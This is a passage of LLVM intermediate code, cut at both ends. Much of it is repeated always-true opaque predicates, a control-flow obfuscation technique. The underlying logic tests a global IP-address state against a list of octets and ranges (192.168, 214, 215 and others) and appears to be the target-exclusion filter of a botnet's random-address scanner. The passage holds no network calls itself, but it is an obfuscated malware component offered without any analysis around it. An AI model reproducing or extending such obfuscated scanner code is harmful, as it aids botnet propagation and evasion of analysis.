  %223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 28
  br i1 %225, label %4994, label %226

; <label>:226:                                    ; preds = %222
  %227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %228 = zext i8 %227 to i32
  %229 = icmp eq i32 %228, 29
  br i1 %229, label %4994, label %230

; <label>:230:                                    ; preds = %226
  %231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %232 = zext i8 %231 to i32
  %233 = icmp eq i32 %232, 30
  br i1 %233, label %4994, label %234

; <label>:234:                                    ; preds = %230
  %235 = load i32, i32* @x.69
  %236 = load i32, i32* @y.70
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %234
  %243 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %244 = zext i8 %243 to i32
  %245 = icmp eq i32 %244, 33
  %246 = load i32, i32* @x.69
  %247 = load i32, i32* @y.70
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %245, label %4994, label %254

; <label>:254:                                    ; preds = %originalBBpart250
  %255 = load i32, i32* @x.69
  %256 = load i32, i32* @y.70
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %254
  %263 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %264 = zext i8 %263 to i32
  %265 = icmp eq i32 %264, 55
  %266 = load i32, i32* @x.69
  %267 = load i32, i32* @y.70
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %265, label %4994, label %274

; <label>:274:                                    ; preds = %originalBBpart254
  %275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %276 = zext i8 %275 to i32
  %277 = icmp eq i32 %276, 214
  br i1 %277, label %4994, label %278

; <label>:278:                                    ; preds = %274
  %279 = load i32, i32* @x.69
  %280 = load i32, i32* @y.70
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %278
  %287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %288 = zext i8 %287 to i32
  %289 = icmp eq i32 %288, 215
  %290 = load i32, i32* @x.69
  %291 = load i32, i32* @y.70
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br i1 %289, label %4994, label %298

; <label>:298:                                    ; preds = %originalBBpart258
  %299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %300 = zext i8 %299 to i32
  %301 = icmp eq i32 %300, 192
  br i1 %301, label %302, label %322

; <label>:302:                                    ; preds = %298
  %303 = load i32, i32* @x.69
  %304 = load i32, i32* @y.70
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %302
  %311 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %312 = zext i8 %311 to i32
  %313 = icmp eq i32 %312, 168
  %314 = load i32, i32* @x.69
  %315 = load i32, i32* @y.70
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %313, label %4994, label %322

; <label>:322:                                    ; preds = %originalBBpart262, %298
  %323 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %324 = zext i8 %323 to i32
  %325 = icmp eq i32 %324, 146
  br i1 %325, label %326, label %330

; <label>:326:                                    ; preds = %322
  %327 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %328 = zext i8 %327 to i32
  %329 = icmp eq i32 %328, 17
  br i1 %329, label %4994, label %330

; <label>:330:                                    ; preds = %326, %322
  %331 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %332 = zext i8 %331 to i32
  %333 = icmp eq i32 %332, 146
  br i1 %333, label %334, label %338

; <label>:334:                                    ; preds = %330
  %335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %336 = zext i8 %335 to i32
  %337 = icmp eq i32 %336, 80
  br i1 %337, label %4994, label %338

; <label>:338:                                    ; preds = %334, %330
  %339 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %340 = zext i8 %339 to i32
  %341 = icmp eq i32 %340, 146
  br i1 %341, label %342, label %362

; <label>:342:                                    ; preds = %338
  %343 = load i32, i32* @x.69
  %344 = load i32, i32* @y.70
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %342
  %351 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %352 = zext i8 %351 to i32
  %353 = icmp eq i32 %352, 98
  %354 = load i32, i32* @x.69
  %355 = load i32, i32* @y.70
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br i1 %353, label %4994, label %362

; <label>:362:                                    ; preds = %originalBBpart266, %338
  %363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %364 = zext i8 %363 to i32
  %365 = icmp eq i32 %364, 146
  br i1 %365, label %366, label %386

; <label>:366:                                    ; preds = %362
  %367 = load i32, i32* @x.69
  %368 = load i32, i32* @y.70
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %366
  %375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %376 = zext i8 %375 to i32
  %377 = icmp eq i32 %376, 154
  %378 = load i32, i32* @x.69
  %379 = load i32, i32* @y.70
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br i1 %377, label %4994, label %386

; <label>:386:                                    ; preds = %originalBBpart270, %362
  %387 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %388 = zext i8 %387 to i32
  %389 = icmp eq i32 %388, 147
  br i1 %389, label %390, label %394

; <label>:390:                                    ; preds = %386
  %391 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %392 = zext i8 %391 to i32
  %393 = icmp eq i32 %392, 159
  br i1 %393, label %4994, label %394

; <label>:394:                                    ; preds = %390, %386
  %395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %396 = zext i8 %395 to i32
  %397 = icmp eq i32 %396, 148
  br i1 %397, label %398, label %402

; <label>:398:                                    ; preds = %394
  %399 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %400 = zext i8 %399 to i32
  %401 = icmp eq i32 %400, 114
  br i1 %401, label %4994, label %402

; <label>:402:                                    ; preds = %398, %394
  %403 = load i32, i32* @x.69
  %404 = load i32, i32* @y.70
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %402
  %411 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %412 = zext i8 %411 to i32
  %413 = icmp eq i32 %412, 150
  %414 = load i32, i32* @x.69
  %415 = load i32, i32* @y.70
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br i1 %413, label %422, label %426

; <label>:422:                                    ; preds = %originalBBpart274
  %423 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %424 = zext i8 %423 to i32
  %425 = icmp eq i32 %424, 125
  br i1 %425, label %4994, label %426

; <label>:426:                                    ; preds = %422, %originalBBpart274
  %427 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %428 = zext i8 %427 to i32
  %429 = icmp eq i32 %428, 150
  br i1 %429, label %430, label %450

; <label>:430:                                    ; preds = %426
  %431 = load i32, i32* @x.69
  %432 = load i32, i32* @y.70
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %430
  %439 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %440 = zext i8 %439 to i32
  %441 = icmp eq i32 %440, 133
  %442 = load i32, i32* @x.69
  %443 = load i32, i32* @y.70
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %441, label %4994, label %450

; <label>:450:                                    ; preds = %originalBBpart278, %426
  %451 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %452 = zext i8 %451 to i32
  %453 = icmp eq i32 %452, 150
  br i1 %453, label %454, label %458

; <label>:454:                                    ; preds = %450
  %455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %456 = zext i8 %455 to i32
  %457 = icmp eq i32 %456, 144
  br i1 %457, label %4994, label %458

; <label>:458:                                    ; preds = %454, %450
  %459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %460 = zext i8 %459 to i32
  %461 = icmp eq i32 %460, 150
  br i1 %461, label %462, label %482

; <label>:462:                                    ; preds = %458
  %463 = load i32, i32* @x.69
  %464 = load i32, i32* @y.70
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %462
  %471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %472 = zext i8 %471 to i32
  %473 = icmp eq i32 %472, 149
  %474 = load i32, i32* @x.69
  %475 = load i32, i32* @y.70
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br i1 %473, label %4994, label %482

; <label>:482:                                    ; preds = %originalBBpart282, %458
  %483 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %484 = zext i8 %483 to i32
  %485 = icmp eq i32 %484, 150
  br i1 %485, label %486, label %490

; <label>:486:                                    ; preds = %482
  %487 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %488 = zext i8 %487 to i32
  %489 = icmp eq i32 %488, 157
  br i1 %489, label %4994, label %490

; <label>:490:                                    ; preds = %486, %482
  %491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %492 = zext i8 %491 to i32
  %493 = icmp eq i32 %492, 150
  br i1 %493, label %494, label %498

; <label>:494:                                    ; preds = %490
  %495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %496 = zext i8 %495 to i32
  %497 = icmp eq i32 %496, 184
  br i1 %497, label %4994, label %498

; <label>:498:                                    ; preds = %494, %490
  %499 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %500 = zext i8 %499 to i32
  %501 = icmp eq i32 %500, 150
  br i1 %501, label %502, label %506

; <label>:502:                                    ; preds = %498
  %503 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %504 = zext i8 %503 to i32
  %505 = icmp eq i32 %504, 190
  br i1 %505, label %4994, label %506

; <label>:506:                                    ; preds = %502, %498
  %507 = load i32, i32* @x.69
  %508 = load i32, i32* @y.70
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %506
  %515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %516 = zext i8 %515 to i32
  %517 = icmp eq i32 %516, 150
  %518 = load i32, i32* @x.69
  %519 = load i32, i32* @y.70
  %520 = sub i32 %518, 1
  %521 = mul i32 %518, %520
  %522 = urem i32 %521, 2
  %523 = icmp eq i32 %522, 0
  %524 = icmp slt i32 %519, 10
  %525 = or i1 %523, %524
  br i1 %525, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br i1 %517, label %526, label %546

; <label>:526:                                    ; preds = %originalBBpart286
  %527 = load i32, i32* @x.69
  %528 = load i32, i32* @y.70
  %529 = sub i32 %527, 1
  %530 = mul i32 %527, %529
  %531 = urem i32 %530, 2
  %532 = icmp eq i32 %531, 0
  %533 = icmp slt i32 %528, 10
  %534 = or i1 %532, %533
  br i1 %534, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %526
  %535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %536 = zext i8 %535 to i32
  %537 = icmp eq i32 %536, 196
  %538 = load i32, i32* @x.69
  %539 = load i32, i32* @y.70
  %540 = sub i32 %538, 1
  %541 = mul i32 %538, %540
  %542 = urem i32 %541, 2
  %543 = icmp eq i32 %542, 0
  %544 = icmp slt i32 %539, 10
  %545 = or i1 %543, %544
  br i1 %545, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br i1 %537, label %4994, label %546

; <label>:546:                                    ; preds = %originalBBpart290, %originalBBpart286
  %547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %548 = zext i8 %547 to i32
  %549 = icmp eq i32 %548, 152
  br i1 %549, label %550, label %554

; <label>:550:                                    ; preds = %546
  %551 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %552 = zext i8 %551 to i32
  %553 = icmp eq i32 %552, 82
  br i1 %553, label %4994, label %554

; <label>:554:                                    ; preds = %550, %546
  %555 = load i32, i32* @x.69
  %556 = load i32, i32* @y.70
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %554
  %563 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %564 = zext i8 %563 to i32
  %565 = icmp eq i32 %564, 152
  %566 = load i32, i32* @x.69
  %567 = load i32, i32* @y.70
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br i1 %565, label %574, label %594

; <label>:574:                                    ; preds = %originalBBpart294
  %575 = load i32, i32* @x.69
  %576 = load i32, i32* @y.70
  %577 = sub i32 %575, 1
  %578 = mul i32 %575, %577
  %579 = urem i32 %578, 2
  %580 = icmp eq i32 %579, 0
  %581 = icmp slt i32 %576, 10
  %582 = or i1 %580, %581
  br i1 %582, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %574
  %583 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %584 = zext i8 %583 to i32
  %585 = icmp eq i32 %584, 229
  %586 = load i32, i32* @x.69
  %587 = load i32, i32* @y.70
  %588 = sub i32 %586, 1
  %589 = mul i32 %586, %588
  %590 = urem i32 %589, 2
  %591 = icmp eq i32 %590, 0
  %592 = icmp slt i32 %587, 10
  %593 = or i1 %591, %592
  br i1 %593, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br i1 %585, label %4994, label %594

; <label>:594:                                    ; preds = %originalBBpart298, %originalBBpart294
  %595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %596 = zext i8 %595 to i32
  %597 = icmp eq i32 %596, 157
  br i1 %597, label %598, label %602

; <label>:598:                                    ; preds = %594
  %599 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %600 = zext i8 %599 to i32
  %601 = icmp eq i32 %600, 202
  br i1 %601, label %4994, label %602

; <label>:602:                                    ; preds = %598, %594
  %603 = load i32, i32* @x.69
  %604 = load i32, i32* @y.70
  %605 = sub i32 %603, 1
  %606 = mul i32 %603, %605
  %607 = urem i32 %606, 2
  %608 = icmp eq i32 %607, 0
  %609 = icmp slt i32 %604, 10
  %610 = or i1 %608, %609
  br i1 %610, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %602
  %611 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %612 = zext i8 %611 to i32
  %613 = icmp eq i32 %612, 157
  %614 = load i32, i32* @x.69
  %615 = load i32, i32* @y.70
  %616 = sub i32 %614, 1
  %617 = mul i32 %614, %616
  %618 = urem i32 %617, 2
  %619 = icmp eq i32 %618, 0
  %620 = icmp slt i32 %615, 10
  %621 = or i1 %619, %620
  br i1 %621, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br i1 %613, label %622, label %626

; <label>:622:                                    ; preds = %originalBBpart2102
  %623 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %624 = zext i8 %623 to i32
  %625 = icmp eq i32 %624, 217
  br i1 %625, label %4994, label %626

; <label>:626:                                    ; preds = %622, %originalBBpart2102
  %627 = load i32, i32* @x.69
  %628 = load i32, i32* @y.70
  %629 = sub i32 %627, 1
  %630 = mul i32 %627, %629
  %631 = urem i32 %630, 2
  %632 = icmp eq i32 %631, 0
  %633 = icmp slt i32 %628, 10
  %634 = or i1 %632, %633
  br i1 %634, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %626
  %635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %636 = zext i8 %635 to i32
  %637 = icmp eq i32 %636, 161
  %638 = load i32, i32* @x.69
  %639 = load i32, i32* @y.70
  %640 = sub i32 %638, 1
  %641 = mul i32 %638, %640
  %642 = urem i32 %641, 2
  %643 = icmp eq i32 %642, 0
  %644 = icmp slt i32 %639, 10
  %645 = or i1 %643, %644
  br i1 %645, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br i1 %637, label %646, label %650

; <label>:646:                                    ; preds = %originalBBpart2106
  %647 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %648 = zext i8 %647 to i32
  %649 = icmp eq i32 %648, 124
  br i1 %649, label %4994, label %650

; <label>:650:                                    ; preds = %646, %originalBBpart2106
  %651 = load i32, i32* @x.69
  %652 = load i32, i32* @y.70
  %653 = sub i32 %651, 1
  %654 = mul i32 %651, %653
  %655 = urem i32 %654, 2
  %656 = icmp eq i32 %655, 0
  %657 = icmp slt i32 %652, 10
  %658 = or i1 %656, %657
  br i1 %658, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %650
  %659 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %660 = zext i8 %659 to i32
  %661 = icmp eq i32 %660, 162
  %662 = load i32, i32* @x.69
  %663 = load i32, i32* @y.70
  %664 = sub i32 %662, 1
  %665 = mul i32 %662, %664
  %666 = urem i32 %665, 2
  %667 = icmp eq i32 %666, 0
  %668 = icmp slt i32 %663, 10
  %669 = or i1 %667, %668
  br i1 %669, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br i1 %661, label %670, label %674

; <label>:670:                                    ; preds = %originalBBpart2110
  %671 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %672 = zext i8 %671 to i32
  %673 = icmp eq i32 %672, 32
  br i1 %673, label %4994, label %674

; <label>:674:                                    ; preds = %670, %originalBBpart2110
  %675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %676 = zext i8 %675 to i32
  %677 = icmp eq i32 %676, 155
  br i1 %677, label %678, label %682

; <label>:678:                                    ; preds = %674
  %679 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %680 = zext i8 %679 to i32
  %681 = icmp eq i32 %680, 96
  br i1 %681, label %4994, label %682

; <label>:682:                                    ; preds = %678, %674
  %683 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %684 = zext i8 %683 to i32
  %685 = icmp eq i32 %684, 155
  br i1 %685, label %686, label %690

; <label>:686:                                    ; preds = %682
  %687 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %688 = zext i8 %687 to i32
  %689 = icmp eq i32 %688, 149
  br i1 %689, label %4994, label %690

; <label>:690:                                    ; preds = %686, %682
  %691 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %692 = zext i8 %691 to i32
  %693 = icmp eq i32 %692, 155
  br i1 %693, label %694, label %698

; <label>:694:                                    ; preds = %690
  %695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %696 = zext i8 %695 to i32
  %697 = icmp eq i32 %696, 155
  br i1 %697, label %4994, label %698

; <label>:698:                                    ; preds = %694, %690
  %699 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %700 = zext i8 %699 to i32
  %701 = icmp eq i32 %700, 155
  br i1 %701, label %702, label %706

; <label>:702:                                    ; preds = %698
  %703 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %704 = zext i8 %703 to i32
  %705 = icmp eq i32 %704, 178
  br i1 %705, label %4994, label %706

; <label>:706:                                    ; preds = %702, %698
  %707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %708 = zext i8 %707 to i32
  %709 = icmp eq i32 %708, 164
  br i1 %709, label %710, label %714

; <label>:710:                                    ; preds = %706
  %711 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %712 = zext i8 %711 to i32
  %713 = icmp eq i32 %712, 158
  br i1 %713, label %4994, label %714

; <label>:714:                                    ; preds = %710, %706
  %715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %716 = zext i8 %715 to i32
  %717 = icmp eq i32 %716, 156
  br i1 %717, label %718, label %722

; <label>:718:                                    ; preds = %714
  %719 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %720 = zext i8 %719 to i32
  %721 = icmp eq i32 %720, 9
  br i1 %721, label %4994, label %722

; <label>:722:                                    ; preds = %718, %714
  %723 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %724 = zext i8 %723 to i32
  %725 = icmp eq i32 %724, 167
  br i1 %725, label %726, label %746

; <label>:726:                                    ; preds = %722
  %727 = load i32, i32* @x.69
  %728 = load i32, i32* @y.70
  %729 = sub i32 %727, 1
  %730 = mul i32 %727, %729
  %731 = urem i32 %730, 2
  %732 = icmp eq i32 %731, 0
  %733 = icmp slt i32 %728, 10
  %734 = or i1 %732, %733
  br i1 %734, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %726
  %735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %736 = zext i8 %735 to i32
  %737 = icmp eq i32 %736, 44
  %738 = load i32, i32* @x.69
  %739 = load i32, i32* @y.70
  %740 = sub i32 %738, 1
  %741 = mul i32 %738, %740
  %742 = urem i32 %741, 2
  %743 = icmp eq i32 %742, 0
  %744 = icmp slt i32 %739, 10
  %745 = or i1 %743, %744
  br i1 %745, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br i1 %737, label %4994, label %746

; <label>:746:                                    ; preds = %originalBBpart2114, %722
  %747 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
